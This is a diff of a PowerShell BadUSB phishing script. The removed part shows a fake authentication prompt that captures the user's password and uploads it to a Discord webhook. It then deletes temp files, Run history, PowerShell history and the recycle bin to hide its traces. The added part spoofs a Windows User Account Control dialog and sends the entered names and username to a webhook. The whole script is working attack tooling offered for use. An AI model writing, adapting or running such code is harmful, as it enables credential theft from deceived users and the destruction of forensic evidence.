@@ -1,111 +1,54 @@
-#code is not mine, i am just uploading for personal use repo: https://github.com/FibraLogica/Flipper_badusb_Phishing/blob/main/Flipper_badusb_Phishing.ps1
-$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
-
-function Get-Creds {
-
-    $form = $null
-
-    while ($form -eq $null)
-    {
-        $cred = $host.ui.promptforcredential('Autenticação EPFF-INTEP','','',''); 
-        $cred.getnetworkcredential().password
-
-        if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password))
-        {
-            if(-not ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.ManifestModule -like "*PresentationCore*" -or $_.ManifestModule -like "*PresentationFramework*" }))
-            {
-                Add-Type -AssemblyName PresentationCore,PresentationFramework
-            }
-
-            $msgBody = "As informações não podem estar vazias!"
-            $msgTitle = "Erro de autenticação"
-            $msgButton = 'Ok'
-            $msgImage = 'Stop'
-            $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
-            Write-Host "The user clicked: $Result"
-            $form = $null
-        }
-        
-        else{
-            $creds = $cred.GetNetworkCredential() | fl
-            return $creds
-        }
-    }
-}
-
-function Caps-Off {
 Add-Type -AssemblyName System.Windows.Forms
-$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
 
-#If true, toggle CapsLock key, to ensure that the script doesn't fail
-if ($caps -eq $true){
+$form = New-Object System.Windows.Forms.Form
+$form.Text = "User Account Control"
+$form.Size = New-Object System.Drawing.Size(480,230)
+$form.FormBorderStyle = 'FixedDialog'
+$form.StartPosition = 'CenterScreen'
+$form.TopMost = $true
+$form.MaximizeBox = $false
+$form.MinimizeBox = $false
 
-$key = New-Object -ComObject WScript.Shell
-$key.SendKeys('{CapsLock}')
-}
-}
+# Label: UAC message
+$label = New-Object System.Windows.Forms.Label
+$label.Text = "Do you want to allow this app to make changes to your device?"
+$label.Size = New-Object System.Drawing.Size(440,40)
+$label.Location = New-Object System.Drawing.Point(20,20)
+$label.Font = New-Object System.Drawing.Font("Segoe UI",12)
+$form.Controls.Add($label)
 
-Pause-Script
+# TextBox: First Name
+$tb1 = New-Object System.Windows.Forms.TextBox
+$tb1.PlaceholderText = "First Name"
+$tb1.Location = New-Object System.Drawing.Point(20,80)
+$tb1.Size = New-Object System.Drawing.Size(200,30)
+$form.Controls.Add($tb1)
 
-Caps-Off
+# TextBox: Last Name
+$tb2 = New-Object System.Windows.Forms.TextBox
+$tb2.PlaceholderText = "Last Name"
+$tb2.Location = New-Object System.Drawing.Point(240,80)
+$tb2.Size = New-Object System.Drawing.Size(200,30)
+$form.Controls.Add($tb2)
 
-Add-Type -AssemblyName PresentationCore,PresentationFramework
-$msgBody = "Autenticar com a sua conta EPFF-INTEP"
-$msgTitle = "Autenticação necessária"
-$msgButton = 'Ok'
-$msgImage = 'Warning'
-$Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
-Write-Host "The user clicked: $Result"
+# Button
+$btn = New-Object System.Windows.Forms.Button
+$btn.Text = "Yes"
+$btn.Location = New-Object System.Drawing.Point(350,130)
+$btn.Size = New-Object System.Drawing.Size(90,30)
+$btn.Add_Click({
+    $first = $tb1.Text
+    $last = $tb2.Text
+    if ($first -and $last) {
+        # Send to webhook or save locally
+        $webhook = "https://discord.com/api/webhooks/XXXX/XXXX"
+        $msg = @{ content = "$env:USERNAME - $first $last - $(Get-Date)" } | ConvertTo-Json
+        Invoke-RestMethod -Uri $webhook -Method Post -Body $msg -ContentType 'application/json'
+        $form.Close()
+    } else {
+        [System.Windows.Forms.MessageBox]::Show("Please fill in both fields.")
+    }
+})
+$form.Controls.Add($btn)
 
-$creds = Get-Creds
-
-#------------------------------------------------------------------------------------------------------------------------------------
-
-echo $creds >> $env:TMP\$FileName
-
-#------------------------------------------------------------------------------------------------------------------------------------
-
-function Upload-Discord {
-
-[CmdletBinding()]
-param (
-    [parameter(Position=0,Mandatory=$False)]
-    [string]$file,
-    [parameter(Position=1,Mandatory=$False)]
-    [string]$text 
-)
-
-$hookurl = "$dc"
-
-$Body = @{
-  'username' = $env:username
-  'content' = $text
-}
-
-if (-not ([string]::IsNullOrEmpty($text))){
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
-
-if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
-}
-
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\$FileName}
-
-#------------------------------------------------------------------------------------------------------------------------------------
-
-# Delete contents of Temp folder 
-
-rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
-
-# Delete run box history
-
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-
-# Delete powershell history
-
-Remove-Item (Get-PSreadlineOption).HistorySavePath
-
-# Deletes contents of recycle bin
-
-Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-
-exit
+$form.ShowDialog()
